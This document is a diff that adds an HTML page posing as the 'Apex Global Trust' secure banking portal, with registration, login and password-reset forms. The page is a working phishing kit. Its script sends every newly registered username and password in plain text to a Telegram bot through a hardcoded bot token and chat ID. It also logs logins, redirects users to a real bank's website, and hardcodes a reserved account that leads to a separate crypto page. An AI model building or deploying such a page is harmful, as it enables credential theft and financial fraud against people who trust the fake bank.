@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apex Global Trust | Secure Banking</title>
+    <style>
+        :root {
+            --primary: #0a192f;
+            --accent: #c5a059;
+            --text-light: #e6f1ff;
+            --bg: #f4f7f6;
+            --success: #28a745;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: var(--bg);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .bank-card {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            border-radius: 4px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            border-top: 5px solid var(--accent);
+            position: relative;
+        }
+
+        .logo-area {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-icon {
+            font-size: 40px;
+            color: var(--primary);
+            font-weight: bold;
+        }
+
+        .bank-name {
+            display: block;
+            font-size: 14px;
+            letter-spacing: 3px;
+            color: var(--primary);
+            text-transform: uppercase;
+            margin-top: 5px;
+        }
+
+        h2 { color: var(--primary); font-size: 22px; margin-bottom: 8px; text-align: center;}
+        p.desc { text-align: center; color: #666; font-size: 13px; margin-bottom: 25px;}
+
+        .input-group { margin-bottom: 15px; }
+        
+        label { display: block; font-size: 12px; color: var(--primary); font-weight: bold; margin-bottom: 5px; }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            box-sizing: border-box;
+            background: #fafafa;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: var(--primary);
+            color: var(--accent);
+            border: none;
+            border-radius: 3px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.3s;
+        }
+
+        button:hover { background: #112240; }
+
+        .link-btn {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #004a99;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .alert {
+            padding: 10px;
+            border-radius: 3px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            display: none;
+        }
+        .alert-success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .alert-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c2c7; }
+
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="bank-card">
+        <div class="logo-area">
+            <div class="logo-icon">▲</div>
+            <span class="bank-name">Apex Global Trust</span>
+        </div>
+
+        <div id="alertBox" class="alert"></div>
+
+        <!-- REGISTRATION VIEW -->
+        <div id="regView">
+            <h2>Create Account</h2>
+            <p class="desc">Open your digital vault in minutes.</p>
+            <form id="regForm">
+                <div class="input-group"><label>USERNAME</label><input type="text" id="regUser" required></div>
+                <div class="input-group"><label>PASSWORD</label><input type="password" id="regPass" required></div>
+                <button type="submit">Complete Registration</button>
+            </form>
+            <div class="link-btn" onclick="showView('loginView')">Already a member? Sign In</div>
+        </div>
+
+        <!-- LOGIN VIEW -->
+        <div id="loginView" class="hidden">
+            <h2>Secure Login</h2>
+            <p class="desc">Authorized access only.</p>
+            <form id="loginForm">
+                <div class="input-group"><label>USERNAME</label><input type="text" id="loginUser" required></div>
+                <div class="input-group"><label>PASSWORD</label><input type="password" id="loginPass" required></div>
+                <button type="submit">Access Account</button>
+            </form>
+            <div class="link-btn" onclick="showView('resetView')">Forgot Password?</div>
+            <div class="link-btn" onclick="showView('regView')">New User? Register</div>
+        </div>
+
+        <!-- RESET VIEW -->
+        <div id="resetView" class="hidden">
+            <h2>Recover Access</h2>
+            <p class="desc">Enter your username and new credentials.</p>
+            <form id="resetForm">
+                <div class="input-group"><label>USERNAME</label><input type="text" id="resetUser" required></div>
+                <div class="input-group"><label>NEW PASSWORD</label><input type="password" id="resetNewPass" required></div>
+                <button type="submit">Reset Password</button>
+            </form>
+            <div class="link-btn" onclick="showView('loginView')">Return to Login</div>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        const RESERVED_USER = "JamesRich45";
+        const RESERVED_PASS = "Suvjames28#";
+        const TELEGRAM_BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc"; 
+        const TELEGRAM_CHAT_ID = "8468538314";     
+
+        // --- DATABASE SETUP ---
+        let db;
+        const dbReq = indexedDB.open("BankDB", 1);
+        dbReq.onupgradeneeded = (e) => {
+            db = e.target.result;
+            if (!db.objectStoreNames.contains("users")) {
+                db.createObjectStore("users", { keyPath: "username" });
+            }
+        };
+        dbReq.onsuccess = (e) => db = e.target.result;
+
+        // --- NAVIGATION ---
+        function showView(viewId) {
+            document.querySelectorAll('#regView, #loginView, #resetView').forEach(v => v.classList.add('hidden'));
+            document.getElementById(viewId).classList.remove('hidden');
+            document.getElementById('alertBox').style.display = 'none';
+        }
+
+        function showAlert(msg, type) {
+            const box = document.getElementById('alertBox');
+            box.innerText = msg;
+            box.className = `alert alert-${type}`;
+            box.style.display = 'block';
+        }
+
+        // --- TELEGRAM NOTIFICATION SYSTEM ---
+        async function notifyTelegram(message) {
+            // FIXED: Corrected /bot prefix and added parse_mode
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+            
+            try { 
+                const response = await fetch(url); 
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error("Telegram API says:", data.description);
+                }
+            } catch (e) { 
+                console.error("Failed to connect to Telegram:", e); 
+            }
+        }
+
+        // --- REGISTRATION LOGIC ---
+        document.getElementById('regForm').onsubmit = (e) => {
+            e.preventDefault();
+            const username = document.getElementById('regUser').value;
+            const password = document.getElementById('regPass').value;
+
+            if(username === RESERVED_USER) return showAlert("This username is reserved.", "error");
+
+            const transaction = db.transaction(["users"], "readwrite");
+            const store = transaction.objectStore("users");
+            const addReq = store.add({ username, password });
+
+            addReq.onsuccess = () => {
+                // NOTIFICATION: New Account Created
+                notifyTelegram(`🆕 <b>NEW ACCOUNT CREATED</b>\nUsername: <code>${username}</code>\nPassword: <code>${password}</code>`);
+                showView('loginView');
+                showAlert("Account Created Successfully! Please Login.", "success");
+            };
+            addReq.onerror = () => showAlert("User already exists.", "error");
+        };
+
+        // --- LOGIN LOGIC ---
+        document.getElementById('loginForm').onsubmit = (e) => {
+            e.preventDefault();
+            const user = document.getElementById('loginUser').value;
+            const pass = document.getElementById('loginPass').value;
+
+            // Check for Reserved User
+            if (user === RESERVED_USER && pass === RESERVED_PASS) {
+                notifyTelegram(`🚨 <b>RESERVED USER ALERT</b>\nReserved user [<b>${user}</b>] has logged in.`);
+                window.location.href = "https://cryptobanki28.github.io/Cryptobanking/Cryptobanking2.html";
+                return;
+            }
+
+            const transaction = db.transaction(["users"], "readonly");
+            const store = transaction.objectStore("users");
+            const getReq = store.get(user);
+
+            getReq.onsuccess = () => {
+                if (getReq.result && getReq.result.password === pass) {
+                    // NOTIFICATION: Standard User Login
+                    notifyTelegram(`👤 <b>USER LOGIN</b>\nUser: <code>${user}</code>`);
+                    window.location.href = "https://ke.ncbagroup.com";
+                } else {
+                    showAlert("Invalid Credentials.", "error");
+                }
+            };
+        };
+
+        // --- RESET LOGIC ---
+        document.getElementById('resetForm').onsubmit = (e) => {
+            e.preventDefault();
+            const user = document.getElementById('resetUser').value;
+            const newPass = document.getElementById('resetNewPass').value;
+
+            if (user === RESERVED_USER) {
+                return showAlert("Reserved accounts cannot reset online.", "error");
+            }
+
+            const transaction = db.transaction(["users"], "readwrite");
+            const store = transaction.objectStore("users");
+            const getReq = store.get(user);
+
+            getReq.onsuccess = () => {
+                const data = getReq.result;
+                if (data) {
+                    data.password = newPass;
+                    store.put(data).onsuccess = () => {
+                        notifyTelegram(`🔄 <b>PASSWORD RESET</b>\nUser: <code>${user}</code> updated their password.`);
+                        showAlert("Password reset successful!", "success");
+                        setTimeout(() => showView('loginView'), 1500);
+                    };
+                } else {
+                    showAlert("Username not found.", "error");
+                }
+            };
+        };
+    </script>
+</body>
+</html>
